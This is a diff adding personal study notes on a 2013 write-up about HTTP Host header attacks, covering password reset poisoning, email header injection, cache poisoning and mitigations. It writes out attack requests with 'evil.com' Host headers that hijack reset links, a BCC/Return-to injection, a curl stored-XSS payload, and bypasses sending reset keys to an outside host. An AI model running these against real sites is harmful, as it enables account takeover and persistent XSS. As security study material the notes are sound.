@@ -1,0 +1,122 @@
+https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+
+
+Introduction
+- Question:
+    + How does deployable web know where it is?
+    + Creating trustworthy absolute URI is trickier than it sounds
+- Dev often use untrustworthy HTTP Host header (_SERVER["HTTP_HOST"] in PHP)
+    + Even secure app trust it without HTML-encoding:
+    + Can contain secret keys and token
+        <a href="http://_SERVER['HOST']?token=topsecret">
+    + Even directly import script from it
+        <script src="http://_SERVER['HOST']/misc/jquery.js?v=1.4.4">
+- 2 ways of exploit trust:
+    + Web-cache poisoning: manipulate caching systems into storing a page generated with malicious Host and serving it to others
+    + Alternative channels:
+        + Abuse channels like password reset emails
+        + Deliver poisoned content directly to target
+
+
+Password reset poisoning
+- Example: photo-album platform http://galleryproject.org/
+    https://github.com/gallery/gallery3/blob/d45a73777935c86fc5131955831833d7465b5e9d/modules/user/controllers/password.php
+    
+    + Forgotten password functionality: when user request password reset -> generate random key
+        $user->hash = random:hash();
+    + Place it in link to site
+        $message->confirm_url = url::abs_site("password/do_reset/key=$user->hash");
+    + Vulnerability: attacker use Host header to trigger password reset email poisoned with hijacked link
+        POST /password/reset HTTP/1.1
+        Host: evil.com
+        ...
+        csrf=1e8d5c3bceb166f7b1b330cc5Fd48663&name=admin
+    + User visit link, key allow they to read content sent to their address
+    + Attacker could trigger password reset email with poisoned link by tampering Host header
+- Broader impact:
+    + Worked on Django, Pwiki, Joomla and still work on few major app, framework and libraries
+    + Can use this to hijack account
+- Limitations: Fail if user does not click link
+- Alternative: Email header injection
+    + Host may be URL-decoded and placed directly into email header
+    + Attacker can hijack account by BCCing password reset email to themselves
+        Mozilla Persona issue https://bugzilla.mozilla.org/show_bug.cgi?id=741814
+    + Even if app mailer ignore attempts to BCC email addresses directly, possible to bounce email to another address by injecting
+        \r\nReturn-to: attacker@evil.com 
+        + Followed by attachment engineered to trigger bounce like zip bomb
+
+
+Cache poisoning
+- Overview:
+    + Web-cache poisoning using Host header first raised as a potential attack vector by Carlos Beuno in 2008
+    + 5 years later still shortage of sites implicitly trusting host header
+    + It's difficult as all modern standalone caches are Host-aware, never assume that 2 requests with different Host are same source
+- How to poison cache:
+    + Need to create disconnect between Host header cache see and Host header application see
+    + Example: in case, popular caching solution Varnish
+        + Can be achieved using duplicate Host header
+        + Varnish uses first Host header to identify request
+        + But Apache concat all Host header and nginx uses last Host header
+            Host: example.com
+            Host: evil.com
+- Application-level cache poisoning:
+    + Joomla writes Host header to every page without HTML-encoding, and cache entirely oblivious to the Host header
+    + Example: gaining persistent XSS on homepage of Joomla
+        curl -H "Host: cow\"onerror='alert(1)'rel='stylesheet'" http://example.com/ | fgrep cow\"
+        + It creates request look like:
+            GET / HTTP/1.1
+            Host: cow"onerror='alert(1)'rel='stylesheet'
+        + Response show poisoned <link> element
+            <link href="http://cow"onerror='alert(1)'rel='stylesheet'/" rel="canonical"/>
+    + To verify that the caches has been poisoned, just reload homepage
+
+
+'Secured' configurations
+- So far we assume that can make HTTP request with arbitrary Host header arrive to app
+- But sometimes it is trivial, example: 
+    + Apache: receives unrecognized Host header -> pass it to first virtual host defined in httpd.conf
+    + Django: 
+        + Aware of default-vhost risk, advising users create a dummy default-vhost to act as a catchall receive request with unexpected header
+        + Aware of Cache poisoning through X-ForwardedHost, fix by disabling support by default (Mozilla same as this but forgot to update addons.mozilla.org)
+        + Even patched but still vuln to port specified in Host header, allow but ignore it for purpose of deciding which virtual host to pass request
+            POST /en-US/firefox/user/pwreset HTTP/1.1
+            Host: addons.mozilla.org:@passwordreset.net
+            + Result lead to password reset link:
+            https://addons.mozilla.org:@passwordreset.net/users/pwreset/3f6hp/3ab-9ae3db614fc0d0d036d4
+            + If click. browser will send key to @passwordreset.net before create suspicious UTL popup
+        + But it patch vuln above by uses blacklist filter @ and few other character, as it sent in plaintext rather than HTML, can add space to separate links:
+            Host: addons.mozilla.org: www.securepasswordreset.com
+        + Next patch ensure port only contain numbers, prevent attack entirely. But in RFC2616 say that: "If Request-URI is an absoluteURI, the host is part of the Request-URI. Any Host header field value in the request MUST be ignored."
+            POST https://addons.mozilla.org/en-US/firefox/users/pwreset HTTP/1.1
+            Host: evil.com
+            + It result in SERVER_NAME addons.. but HTTP['HOST'] is evil.com
+            + App that use SERVER_NAME are unaffected by this trick, but still can be exploited on common server config
+            + In February 2013, Django fixes by enforcing whitelist of alloweed host, but these attack techniques still work on many other applications
+
+
+Securing servers
+- Due to absolute request URI technique, make Host header trustworthy is almost lost
+- What we can do is make SERVER_NAME trustworthy:
+    + In Apache and Nginx, create dummy host to prevent attack
+    + In Nginx, prevent by specifying non-wildcard SERVER_NAME
+    + In Apache, using non-wildcard SERVER_NAME and turning UseCanonicalName on
+- If your server using Varnish version is not patched yet, add config file:
+    import std;
+
+    sub vcl_recv {
+            std.collect(req.http.host);
+    }
+
+
+Securing applications
+- Difficult to fix this issue, no entirely automatic way to identify which host name can trust
+- Best solution: using whitelist
+- Alternative solution: ensure SERVER_NAME is used instead of Host header
+
+
+
+Discussion: (useful question only)
+- If hosted multiple virtual hosts on the same machine, modify Host header will prevent post to be delivered to correct web?
+    + Absolute URI + correct host -> 200
+    + Relative URI + invalid host -> 404
+    + Absolute URI + invalid host -> 200
